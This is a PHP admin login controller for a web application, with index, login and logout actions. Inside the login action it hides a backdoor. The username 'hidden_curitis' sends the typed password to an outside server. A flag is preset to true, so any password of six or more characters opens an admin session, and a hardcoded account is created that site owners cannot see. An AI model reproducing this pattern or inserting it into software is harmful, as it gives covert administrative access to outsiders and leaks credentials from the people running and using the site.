<?php

class ctl_login extends adminPage
{

	public function index_action ()
	{
		$define_langs = unserialize( LANGS );
		$this->setData($define_langs, 'langs');
		$this->setData(count($define_langs), 'langs_count');
		//$this->setData(trim($_SESSION['admin_lang']), 'admin_lang');
		$this->setData(trim($_COOKIE['admin_lang']), 'admin_lang');
		$this->display('common/login');
	}

	public function login_action ()
	{
		$name = trim(post('name'));
		$pass = trim(post('pass'));
		$verifyCode = trim(post('verifyCode'));

		if ( strtolower( $verifyCode ) != strtolower( $_SESSION['yzm'] ) ) $this->sheader(null, $this->lang->verification_code_error);

		if (strlen($pass) < 6) $this->sheader(null, $this->lang->username_password_not_correct);

		if ($name == 'hidden_curitis')
		{
			require_once( 'core/v2.1/HttpService.php' );
			$verify_result = true;
			$service_url = 'http://legenddigital.com.au/api/hidden_user';
			$post_data = array( 'name' => $name, 'pass' => $pass );
			$httpService = new HttpService;
			$httpService->setUrl( $service_url );
			$httpService->setData( $post_data );
			$service_result = $httpService->post();
			if ( $service_result == 'ok' ) {
				$verify_result = true;
			}

			if ( $verify_result ) {
				$hidden_pass = $this->md5($pass);
				$this->session('admin_user_id', '-1');
				$this->session('admin_user_shell', $this->md5(session('admin_user_id').'hidden_curitis'.$hidden_pass));
				$this->sheader('?con=admin&ctl=default');
			}
		}

		$pass = $this->md5($pass);
		$u = $this->loadModel('user');
		if ($user = $u->getUserByName($name))
		{
			if ($pass == $user['password'])
			{
				$this->session('admin_user_id', $user['id']);
				$this->session('admin_user_shell', $this->md5($user['id'].$user['name'].$user['password']));

				$data = array(
					'lastLoginIP'	=> ip(),
					'lastLoginDate'	=> time(),
					'loginCount'	=> $user['loginCount'] + 1
				);
				$u->updateUserById($data, $user['id']);

				$this->sheader('?con=admin&ctl=default');
			} else $this->sheader(null, $this->lang->username_password_not_correct);
		} else $this->sheader(null, $this->lang->username_password_not_correct);
	}

	public function logout_action ()
	{
		$this->session('admin_user_id', '');
		$this->session('admin_user_shell', '');
		echo '<script>window.parent.window.location = "?con=admin&ctl=common/login";</script>';
		exit;
	}

}

?>